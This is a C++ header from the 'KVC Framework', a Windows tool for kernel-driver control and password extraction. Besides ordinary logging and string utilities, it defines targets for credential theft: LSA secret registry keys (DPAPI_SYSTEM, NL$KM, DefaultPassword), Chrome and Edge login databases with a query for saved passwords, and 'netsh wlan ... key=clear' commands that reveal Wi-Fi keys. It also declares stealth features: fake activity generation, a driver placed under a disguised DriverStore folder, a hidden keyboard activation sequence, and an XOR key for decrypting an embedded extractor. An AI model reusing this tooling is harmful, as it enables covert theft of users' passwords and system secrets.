/**
 * @file common.h
 * @brief Common definitions, utilities and includes for KVC Framework
 * @author Marek Wesolowski
 * @date 2025
 * @copyright KVC Framework
 * 
 * Central header containing Windows API includes, type definitions,
 * logging system, and cross-cutting utilities used throughout the framework.
 */

#pragma once

#include <Windows.h>
#include <winternl.h>
#include <DbgHelp.h>
#include <Shellapi.h>
#include <Shlobj.h>
#include <accctrl.h>
#include <aclapi.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <optional>
#include <sstream>
#include <array>
#include <chrono>
#include <memory>
#include <vector>
#include <algorithm>
#include <iomanip>
#include <filesystem>

#pragma comment(lib, "crypt32.lib")

// Session management constants
inline constexpr int MAX_SESSIONS = 16;  ///< Maximum number of stored sessions

#ifdef BUILD_DATE
    #define __DATE__ BUILD_DATE  ///< Build date override for reproducible builds
#endif

#ifdef BUILD_TIME  
    #define __TIME__ BUILD_TIME  ///< Build time override for reproducible builds
#endif

#define kvc_DEBUG_ENABLED 0  ///< Global debug flag (0=disabled, 1=enabled)

#ifdef ERROR
#undef ERROR  ///< Undefine Windows ERROR macro to avoid conflicts
#endif

#ifndef SHTDN_REASON_MAJOR_SOFTWARE
#define SHTDN_REASON_MAJOR_SOFTWARE 0x00030000  ///< Software shutdown reason
#endif

#ifndef SHTDN_REASON_MINOR_RECONFIGURE  
#define SHTDN_REASON_MINOR_RECONFIGURE 0x00000004  ///< Reconfiguration shutdown reason
#endif

// Smart module handle management

/**
 * @brief Custom deleter for HMODULE with FreeLibrary
 */
struct ModuleDeleter {
    /**
     * @brief Free library module
     * @param mod Module handle to free
     */
    void operator()(HMODULE mod) const noexcept {
        if (mod) {
            FreeLibrary(mod);
        }
    }
};

/**
 * @brief Custom deleter for system modules (no cleanup needed)
 */
struct SystemModuleDeleter {
    /**
     * @brief No-op deleter for system modules from GetModuleHandle
     * @param mod Module handle (ignored)
     */
    void operator()(HMODULE) const noexcept {
        // System modules obtained via GetModuleHandle don't need to be freed
    }
};

using ModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, ModuleDeleter>;  ///< Smart pointer for loaded modules
using SystemModuleHandle = std::unique_ptr<std::remove_pointer_t<HMODULE>, SystemModuleDeleter>;  ///< Smart pointer for system modules

// Fixed logging system with proper buffer size and variadic handling

/**
 * @brief Print formatted message with prefix
 * @tparam Args Variadic template arguments
 * @param prefix Message prefix (e.g., "[DEBUG] ")
 * @param format Format string (printf-style)
 * @param args Format arguments
 */
template<typename... Args>
void PrintMessage(const wchar_t* prefix, const wchar_t* format, Args&&... args)
{
    std::wstringstream ss;
    ss << prefix;
    
    if constexpr (sizeof...(args) == 0)
    {
        ss << format;
    }
    else
    {
        wchar_t buffer[1024];
        swprintf_s(buffer, 1024, format, std::forward<Args>(args)...);
        ss << buffer;
    }
    
    ss << L"\r\n";
    std::wcout << ss.str();
}

/**
 * @brief Print critical message in red color
 * @tparam Args Variadic template arguments
 * @param format Format string (printf-style)
 * @param args Format arguments
 */
template<typename... Args>
void PrintCriticalMessage(const wchar_t* format, Args&&... args) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    WORD originalColor = csbi.wAttributes;
    
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
    
    std::wstringstream ss;
    ss << L"[!] ";
    
    if constexpr (sizeof...(args) > 0) {
        wchar_t buffer[1024];
        swprintf_s(buffer, 1024, format, std::forward<Args>(args)...);
        ss << buffer;
    } else {
        ss << format;
    }
    
    ss << L"\r\n";
    std::wcout << ss.str();
    
    SetConsoleTextAttribute(hConsole, originalColor);
}

#if kvc_DEBUG_ENABLED
    #define DEBUG(format, ...) PrintMessage(L"[DEBUG] ", format, ##__VA_ARGS__)  ///< Debug logging macro
#else
    #define DEBUG(format, ...) do {} while(0)  ///< Debug logging macro (disabled)
#endif

#define ERROR(format, ...) PrintMessage(L"[-] ", format, ##__VA_ARGS__)      ///< Error logging macro
#define INFO(format, ...) PrintMessage(L"[*] ", format, ##__VA_ARGS__)       ///< Info logging macro
#define SUCCESS(format, ...) PrintMessage(L"[+] ", format, ##__VA_ARGS__)    ///< Success logging macro
#define CRITICAL(format, ...) PrintCriticalMessage(format, ##__VA_ARGS__)    ///< Critical error logging macro

/**
 * @brief Log last error for failed function
 * @param f Function name that failed
 */
#define LASTERROR(f) \
    do { \
        wchar_t buf[256]; \
        swprintf_s(buf, 256, L"[-] The function '%s' failed with error code 0x%08x.\r\n", L##f, GetLastError()); \
        std::wcout << buf; \
    } while(0)

// Windows protection type definitions

/**
 * @brief Process protection level enumeration
 */
enum class PS_PROTECTED_TYPE : UCHAR
{
    None = 0,           ///< No protection
    ProtectedLight = 1, ///< Protected Process Light (PPL)
    Protected = 2       ///< Protected Process (PP)
};

/**
 * @brief Process signer type enumeration
 */
enum class PS_PROTECTED_SIGNER : UCHAR
{
    None = 0,           ///< No signer
    Authenticode = 1,   ///< Authenticode signed
    CodeGen = 2,        ///< Code generation
    Antimalware = 3,    ///< Antimalware products
    Lsa = 4,            ///< Local Security Authority
    Windows = 5,        ///< Windows signed
    WinTcb = 6,         ///< Windows TCB (Trusted Computing Base)
    WinSystem = 7,      ///< Windows system components
    App = 8,            ///< Application signer
    Max = 9             ///< Maximum value
};

// Service-related constants

/**
 * @brief Service-related constants and configuration
 */
namespace ServiceConstants {
    inline constexpr wchar_t SERVICE_NAME[] = L"KernelVulnerabilityControl";              ///< Service internal name
    inline constexpr wchar_t SERVICE_DISPLAY_NAME[] = L"Kernel Vulnerability Capabilities Framework";  ///< Service display name
    inline constexpr wchar_t SERVICE_PARAM[] = L"--service";                              ///< Service mode parameter
    
    // Keyboard hook settings
    inline constexpr int CTRL_SEQUENCE_LENGTH = 5;           ///< Number of Ctrl presses for activation
    inline constexpr DWORD CTRL_SEQUENCE_TIMEOUT_MS = 2000;  ///< Sequence timeout in milliseconds
    inline constexpr DWORD CTRL_DEBOUNCE_MS = 50;            ///< Key debounce period
}

// DPAPI constants for password extraction

/**
 * @brief DPAPI-related constants for password extraction operations
 */
namespace DPAPIConstants {
    inline constexpr int SQLITE_OK = 0;              ///< SQLite success code
    inline constexpr int SQLITE_ROW = 100;           ///< SQLite row available code
    inline constexpr int SQLITE_DONE = 101;          ///< SQLite operation complete code
    inline constexpr int SQLITE_OPEN_READONLY = 0x00000001;  ///< SQLite read-only mode
    
    inline std::string GetChromeV10Prefix() { return "v10"; }        ///< Chrome encrypted key prefix
    inline std::string GetChromeDPAPIPrefix() { return "DPAPI"; }    ///< Chrome DPAPI prefix
    
    inline std::wstring GetSecurityPolicySecrets() { return L"SECURITY\\Policy\\Secrets"; }  ///< Registry path for LSA secrets
    inline std::wstring GetDPAPISystemKey() { return L"DPAPI_SYSTEM"; }      ///< DPAPI system key name
    inline std::wstring GetNLKMKey() { return L"NL$KM"; }                   ///< NL$KM key name
    inline std::wstring GetDefaultPasswordKey() { return L"DefaultPassword"; }  ///< Default password key name
    
    inline std::wstring GetCurrVal() { return L"CurrVal"; }  ///< Current value registry key
    inline std::wstring GetOldVal() { return L"OldVal"; }    ///< Old value registry key
    
    inline std::wstring GetChromeUserData() { return L"\\Google\\Chrome\\User Data"; }   ///< Chrome user data path
    inline std::wstring GetEdgeUserData() { return L"\\Microsoft\\Edge\\User Data"; }    ///< Edge user data path
    inline std::wstring GetLocalStateFile() { return L"\\Local State"; }                 ///< Local state filename
    inline std::wstring GetLoginDataFile() { return L"\\Login Data"; }                   ///< Login data filename
    
    inline std::string GetEncryptedKeyField() { return "\"encrypted_key\":"; }  ///< JSON field for encrypted key
    
    inline std::string GetLocalAppData() { return "LOCALAPPDATA"; }  ///< Local app data environment variable
    
    inline std::wstring GetHTMLExt() { return L".html"; }  ///< HTML file extension
    inline std::wstring GetTXTExt() { return L".txt"; }    ///< Text file extension
    inline std::wstring GetDBExt() { return L".db"; }      ///< Database file extension
    
    inline std::wstring GetTempLoginDB() { return L"temp_login_data.db"; }  ///< Temporary login database name
    inline std::wstring GetTempPattern() { return L"temp_login_data"; }     ///< Temporary file pattern
    
    inline std::string GetNetshShowProfiles() { return "netsh wlan show profiles"; }  ///< Netsh show profiles command
    inline std::string GetNetshShowProfileKey() { return "netsh wlan show profile name=\""; }  ///< Netsh show profile command
    inline std::string GetNetshKeyClear() { return "\" key=clear"; }  ///< Netsh key clear parameter
    
    inline std::string GetWiFiProfileMarker() { return "All User Profile"; }  ///< WiFi profile marker in output
    inline std::string GetWiFiKeyContent() { return "Key Content"; }          ///< WiFi key content marker
    
    inline std::string GetLoginQuery() { return "SELECT origin_url, username_value, password_value FROM logins"; }  ///< SQL query for login data
    
    inline std::wstring GetStatusDecrypted() { return L"DECRYPTED"; }  ///< Decryption successful status
    inline std::wstring GetStatusClearText() { return L"CLEAR_TEXT"; } ///< Clear text status
    inline std::wstring GetStatusEncrypted() { return L"ENCRYPTED"; }  ///< Encrypted status
    inline std::wstring GetStatusFailed() { return L"FAILED"; }        ///< Operation failed status
    inline std::wstring GetStatusExtracted() { return L"EXTRACTED"; }  ///< Data extracted status
}

// Dynamic API loading globals for driver operations
extern ModuleHandle g_advapi32;                         ///< advapi32.dll module handle
extern SystemModuleHandle g_kernel32;                   ///< kernel32.dll module handle
extern decltype(&CreateServiceW) g_pCreateServiceW;     ///< CreateServiceW function pointer
extern decltype(&OpenServiceW) g_pOpenServiceW;         ///< OpenServiceW function pointer
extern decltype(&StartServiceW) g_pStartServiceW;       ///< StartServiceW function pointer
extern decltype(&DeleteService) g_pDeleteService;       ///< DeleteService function pointer
extern decltype(&CreateFileW) g_pCreateFileW;           ///< CreateFileW function pointer
extern decltype(&ControlService) g_pControlService;     ///< ControlService function pointer

// Service mode detection
extern bool g_serviceMode;          ///< Service mode flag
extern volatile bool g_interrupted; ///< Interruption flag for graceful shutdown

// Core driver functions
bool InitDynamicAPIs() noexcept;                                ///< Initialize dynamic API pointers
extern "C" const wchar_t* GetServiceNameRaw();                  ///< Get service name (ASM function)
std::wstring GetServiceName() noexcept;                         ///< Get service name (C++ wrapper)
std::wstring GetDriverFileName() noexcept;                      ///< Get driver filename
void GenerateFakeActivity() noexcept;                           ///< Generate fake activity for stealth
std::wstring GetSystemTempPath() noexcept;                      ///< Get system temp path

// Service utility functions
bool IsServiceInstalled() noexcept;                             ///< Check if service is installed
bool IsServiceRunning() noexcept;                               ///< Check if service is running
std::wstring GetCurrentExecutablePath() noexcept;               ///< Get current executable path

// Driver path helper with dynamic discovery and fallback mechanism

/**
 * @brief Get DriverStore path for driver operations
 * @return DriverStore path string
 * @note Searches for actual avc.inf_amd64_* directory in DriverStore FileRepository
 * @note Creates directory if needed, falls back to system32\drivers on failure
 */
inline std::wstring GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    std::wstring baseResult = windowsDir;
    std::wstring driverStoreBase = baseResult + L"\\System32\\DriverStore\\FileRepository\\";
    
    // Dynamic search for avc.inf_amd64_* pattern in FileRepository
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"avc.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        // Found existing directory - use first match
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // No existing directory found - create with TrustedInstaller privileges
    std::wstring targetPath = driverStoreBase + L"avc.inf_amd64_12ca23d60da30d59";
    return targetPath;
}

/**
 * @brief Get DriverStore path with directory creation
 * @return DriverStore path string, empty on critical failure
 * @note Enhanced version that ensures directory exists before returning path
 */
inline std::wstring GetDriverStorePathSafe() noexcept {
    std::wstring driverPath = GetDriverStorePath();
    
    // Ensure directory exists - critical for driver operations
    DWORD attrs = GetFileAttributesW(driverPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        // Try to create if it doesn't exist
        if (!CreateDirectoryW(driverPath.c_str(), nullptr) && 
            GetLastError() != ERROR_ALREADY_EXISTS) {
            return L""; // Critical failure
        }
    } else if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return L""; // Path exists but is not a directory
    }
    
    return driverPath;
}

// KVC combined binary processing constants
inline constexpr std::array<BYTE, 7> KVC_XOR_KEY = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };  ///< XOR key for binary decryption
inline constexpr wchar_t KVC_DATA_FILE[]  = L"kvc.dat";      ///< Combined binary data file
inline constexpr wchar_t KVC_PASS_FILE[]  = L"kvc_pass.exe"; ///< Password extractor executable
inline constexpr wchar_t KVC_CRYPT_FILE[] = L"kvc_crypt.dll"; ///< Cryptography DLL

// ============================================================================
// CONSOLIDATED UTILITY NAMESPACES
// ============================================================================

/**
 * @brief String conversion and manipulation utilities
 */
namespace StringUtils {
    /**
     * @brief Convert UTF-8 string to wide string (UTF-16 LE)
     * @param str UTF-8 encoded string
     * @return UTF-16 LE encoded wide string, empty on failure
     */
    inline std::wstring UTF8ToWide(const std::string& str) noexcept {
        if (str.empty()) return L"";
        
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.data(), 
                                             static_cast<int>(str.size()), nullptr, 0);
        if (size_needed <= 0) return L"";
        
        std::wstring result(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.data(), static_cast<int>(str.size()), 
                           result.data(), size_needed);
        return result;
    }
    
    /**
     * @brief Convert wide string (UTF-16 LE) to UTF-8 string
     * @param wstr UTF-16 LE encoded wide string
     * @return UTF-8 encoded string, empty on failure
     */
    inline std::string WideToUTF8(const std::wstring& wstr) noexcept {
        if (wstr.empty()) return "";
        
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), 
                                             static_cast<int>(wstr.size()), 
                                             nullptr, 0, nullptr, nullptr);
        if (size_needed <= 0) return "";
        
        std::string result(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), 
                           result.data(), size_needed, nullptr, nullptr);
        return result;
    }
    
    /**
     * @brief Convert string to lowercase in-place
     * @param str String to convert (modified in-place)
     * @return Reference to modified string
     */
    inline std::wstring& ToLowerCase(std::wstring& str) noexcept {
        std::transform(str.begin(), str.end(), str.begin(), ::towlower);
        return str;
    }
    
    /**
     * @brief Create lowercase copy of string
     * @param str String to convert
     * @return Lowercase copy of input string
     */
    inline std::wstring ToLowerCaseCopy(const std::wstring& str) noexcept {
        std::wstring result = str;
        std::transform(result.begin(), result.end(), result.begin(), ::towlower);
        return result;
    }
}

/**
 * @brief Path and filesystem manipulation utilities
 */
namespace PathUtils {
    /**
     * @brief Get user's Downloads folder path
     * @return Full path to Downloads folder, empty on failure
     */
    inline std::wstring GetDownloadsPath() noexcept {
        wchar_t* downloadsPath = nullptr;
        if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &downloadsPath) != S_OK) {
            return L"";
        }
        
        std::wstring result = downloadsPath;
        CoTaskMemFree(downloadsPath);
        return result;
    }
    
    /**
     * @brief Get default secrets output path with timestamp
     * @return Path in format: Downloads\Secrets_DD.MM.YYYY
     */
    inline std::wstring GetDefaultSecretsOutputPath() noexcept {
        std::wstring downloadsPath = GetDownloadsPath();
        if (downloadsPath.empty()) {
            return L"";
        }
        
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &time);
        
        wchar_t dateStr[16];
        swprintf_s(dateStr, L"_%02d.%02d.%04d", 
                   tm.tm_mday, tm.tm_mon + 1, tm.tm_year + 1900);
        
        return downloadsPath + L"\\Secrets" + dateStr;
    }
    
    /**
     * @brief Ensure directory exists, create if missing
     * @param path Directory path to validate/create
     * @return true if directory exists or was created
     */
    inline bool EnsureDirectoryExists(const std::wstring& path) noexcept {
        if (path.empty()) return false;
        
        std::error_code ec;
        if (std::filesystem::exists(path, ec)) {
            return std::filesystem::is_directory(path, ec);
        }
        
        return std::filesystem::create_directories(path, ec) && !ec;
    }
    
    /**
     * @brief Validate directory write access
     * @param path Directory path to test
     * @return true if directory is writable
     */
    inline bool ValidateDirectoryWritable(const std::wstring& path) noexcept {
        try {
            std::filesystem::create_directories(path);
            
            std::wstring testFile = path + L"\\test.tmp";
            HANDLE hTest = CreateFileW(testFile.c_str(), GENERIC_WRITE, 0, nullptr, 
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
            
            if (hTest == INVALID_HANDLE_VALUE) return false;
            
            CloseHandle(hTest);
            DeleteFileW(testFile.c_str());
            return true;
        } catch (...) {
            return false;
        }
    }
}

/**
 * @brief Time and date formatting utilities
 */
namespace TimeUtils {
    /**
     * @brief Get formatted timestamp string
     * @param format Format specifier: "date_only", "datetime_file", "datetime_display"
     * @return Formatted timestamp string
     */
    inline std::wstring GetFormattedTimestamp(const char* format = "datetime_file") noexcept {
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time_t(now);
        std::tm tm;
        localtime_s(&tm, &time);
        
        std::wstringstream ss;
        
        if (strcmp(format, "date_only") == 0) {
            ss << std::put_time(&tm, L"%d.%m.%Y");
        }
        else if (strcmp(format, "datetime_display") == 0) {
            ss << std::put_time(&tm, L"%Y-%m-%d %H:%M:%S");
        }
        else { // datetime_file (default)
            ss << std::put_time(&tm, L"%Y.%m.%d_%H.%M.%S");
        }
        
        return ss.str();
    }
}

/**
 * @brief Cryptographic and encoding utilities
 */
namespace CryptoUtils {
    /**
     * @brief Decode Base64 string to binary data
     * @param encoded Base64-encoded string
     * @return Decoded binary data, empty on failure
     */
    inline std::vector<BYTE> Base64Decode(const std::string& encoded) noexcept {
        if (encoded.empty()) return {};
        
        DWORD decodedSize = 0;
        if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                                 nullptr, &decodedSize, nullptr, nullptr)) {
            return {};
        }
        
        std::vector<BYTE> decoded(decodedSize);
        if (!CryptStringToBinaryA(encoded.c_str(), 0, CRYPT_STRING_BASE64, 
                                 decoded.data(), &decodedSize, nullptr, nullptr)) {
            return {};
        }
        
        decoded.resize(decodedSize);
        return decoded;
    }
    
    /**
     * @brief Convert byte vector to hexadecimal string
     * @param bytes Binary data to convert
     * @param maxBytes Maximum bytes to convert (0 = unlimited)
     * @return Hex string representation
     */
    inline std::string BytesToHex(const std::vector<BYTE>& bytes, size_t maxBytes = 0) noexcept {
        if (bytes.empty()) return "";
        
        size_t limit = (maxBytes > 0 && maxBytes < bytes.size()) ? maxBytes : bytes.size();
        
        std::ostringstream hexStream;
        hexStream << std::hex << std::setfill('0');
        
        for (size_t i = 0; i < limit; ++i) {
            hexStream << std::setw(2) << static_cast<int>(bytes[i]);
        }
        
        if (maxBytes > 0 && bytes.size() > maxBytes) {
            hexStream << "...";
        }
        
        return hexStream.str();
    }
}

/**
 * @brief Windows privilege manipulation utilities
 */
namespace PrivilegeUtils {
    /**
     * @brief Enable specified privilege in current process token
     * @param privilege Privilege name constant
     * @return true if privilege enabled successfully
     */
    inline bool EnablePrivilege(LPCWSTR privilege) noexcept {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), 
                             TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueW(nullptr, privilege, &luid)) {
            CloseHandle(hToken);
            return false;
        }

        TOKEN_PRIVILEGES tp = {};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, 
                                           sizeof(TOKEN_PRIVILEGES), nullptr, nullptr);
        DWORD lastError = GetLastError();
        CloseHandle(hToken);
        
        return result && (lastError == ERROR_SUCCESS);
    }
}